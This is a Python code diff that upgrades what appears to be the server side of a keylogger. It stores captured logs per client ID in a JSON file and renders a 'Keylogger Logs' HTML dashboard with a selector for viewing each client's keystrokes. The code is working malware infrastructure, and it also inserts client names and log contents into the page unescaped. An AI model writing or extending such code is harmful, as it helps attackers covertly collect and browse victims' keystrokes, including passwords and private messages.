@@ -1,11 +1,26 @@
-def read_logs(url = 'storage/logs.txt'):
+import json
+import os
+
+clients = set()
+data = {}
+
+def read_logs(url='storage/logs.json'):
+    global data
     output = []
     
     try:
         with open(url, 'r') as file:
-            for line in file:
-                output.append(line.strip())
-    
+            try:
+                local_data = json.load(file)
+            except json.JSONDecodeError:
+                print("Error: Invalid JSON format.")
+                return []
+
+            for key, value in local_data.items():
+                output.append(str(value).strip())
+                clients.add(key)
+            data = local_data 
+
     except FileNotFoundError:
         print(f"Error: The file '{url}' was not found.")
         return "Error: Log file not found."
@@ -15,14 +30,31 @@ def read_logs(url = 'storage/logs.txt'):
     
     return "\n".join(output)
 
-def write_logs(data, url = 'storage/logs.txt'):
+def write_logs(new_data, url='storage/logs.json'):
+    os.makedirs(os.path.dirname(url), exist_ok=True)
+
     try:
-        with open(url, 'a') as file:
-            file.write(data + "\n")
+        if not os.path.exists(url):
+            with open(url, 'w') as file:
+                json.dump({}, file)
+
+        with open(url, "r") as file:
+            data = json.load(file)
+
+        client_id = new_data['client_id']
+        new_log_data = new_data['log_data']
+        data[client_id] = new_log_data.strip()
+
+        with open(url, "w") as file:
+            json.dump(data, file, indent=4)
     except IOError:
         print(f"Error: Could not write to the file '{url}'.")
 
-def get_html_template(data):
+def get_html_template():
+    client_options = "".join([f'<option value="{client}">{client}</option>' for client in clients])
+    
+    first_client_log = data.get(list(clients)[0], "No logs available") if clients else "No logs available"
+
     html_content = f"""<!DOCTYPE html>
     <html lang="en">
     <head>
@@ -31,7 +63,6 @@ def get_html_template(data):
         <title>Keylogger Logs</title>
         <style>
             @import url('https://fonts.googleapis.com/css2?family=Orbitron&display=swap');
-
             body {{
                 font-family: 'Orbitron', sans-serif;
                 background-color: #0d1117;
@@ -62,14 +93,31 @@ def get_html_template(data):
                 box-shadow: inset 0px 0px 10px rgba(0, 255, 153, 0.3);
                 border-left: 3px solid #00ff99;
             }}
+            select {{
+                background: #161b22;
+                color: #00ff99;
+                border: 1px solid #00ff99;
+                padding: 5px;
+                margin-bottom: 20px;
+                font-size: 1em;
+            }}
         </style>
+        <script>
+            function updateLog() {{
+                var selectedClient = document.getElementById("client-select").value;
+                var logs = {json.dumps(data)};
+                document.getElementById("log-display").textContent = logs[selectedClient] || "No logs available";
+            }}
+        </script>
     </head>
     <body>
         <div class="container">
             <h1>🔐 Keylogger Logs</h1>
-            <pre>{data}</pre>
+            <label for="client-select">Select Client:</label>
+            <select id="client-select" onchange="updateLog()">{client_options}</select>
+            <pre id="log-display">{first_client_log}</pre>
         </div>
     </body>
     </html>"""
-        
+    
     return html_content
